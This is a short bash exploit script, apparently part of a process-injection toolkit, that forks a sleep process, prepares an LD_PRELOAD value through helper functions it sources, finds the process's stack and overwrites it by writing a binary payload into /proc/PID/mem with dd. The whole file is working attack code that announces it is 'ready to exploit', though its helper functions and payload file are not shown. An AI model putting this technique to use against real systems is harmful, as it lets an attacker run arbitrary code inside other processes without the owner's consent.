#!/bin/bash
# Copyright (c) 2017 Rory McNamara. Modified under GPL v2.0 by vr0n

# Check that the TARGET is defined
if [ -z "${1}" ]; then
  : "A target must be defined"
  exit 1
fi

: "payload.sh: Sourcing funcs.sh"
source funcs.sh
wait

set -x
declare -i PID
SLEEPLEN=60
STARTTIME=$(date +%s)

sleep ${SLEEPLEN} 2>/dev/null &
PID=$!
: "'sleep ${SLEEPLEN}' forked to /dev/null with PID of ${PID}"

TARGET="${1}"

: "Entering payload.sh for first time"
set +x
PRELOAD=$(payload ${PID} ${TARGET} PREPARE)
[[ ! $? -eq 0 ]] && { : "Failed to complete payload function using '${PID} ${TARGET} PREPARE' as args" && exit 1 ;}
set -x

if [[ ! -z "${PRELOAD[@]}" ]]; then
	: "Ready to exploit, with LD_PRELOAD='${PRELOAD[@]}'"
else
	: "Ready to exploit, without LD_PRELOAD"
fi

LD_PRELOAD="${PRELOAD[@]}" sleep ${SLEEPLEN} 2>/dev/null &
PID=$!
: "Forking 'sleep ${SLEEPLEN}' to /dev/null again with PID of ${PID}"

: "Entering payload.sh for second time"

set +x
payload ${PID} $@
[[ ! $? -eq 0 ]] && { : "Failed to enter payload.sh using '${PID} ${@}' as args" && exit 1 ;}
set -x

get_stack ${PID}

PAYLOADSIZE=$(($((16#${STACK[1]}))-$((16#${STACK[0]}))))

: "Executing dd command to overwrite stack"
exec dd if=payload.bin of=/proc/${PID}/mem seek=$((16#${STACK[0]})) conv=notrunc status=none bs=1

SECS="$((${SLEEPLEN}-$(($(date +%s)-${STARTTIME}))))"
for SEC in $(seq ${SECS} -1 0); do
  printf "\roverwrite.sh: Be patient for sleep to terminate (approx ${SEC} seconds)"
  sleep 1
done
